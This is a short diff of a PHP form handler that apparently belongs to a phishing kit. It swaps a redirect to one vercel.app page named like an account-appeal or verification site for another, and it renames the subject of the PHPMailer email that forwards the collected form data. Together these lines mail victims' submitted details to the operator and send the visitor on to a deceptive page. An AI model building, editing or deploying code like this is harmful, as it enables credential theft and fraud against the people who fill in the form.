@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://submit-review-apply-for-verificatio.vercel.app/");
+header("Location: https://appeal-a-remove-issue-fix-for-reque.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'ZUBAIR';
+        $mail->Subject = 'TOFEEQ';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
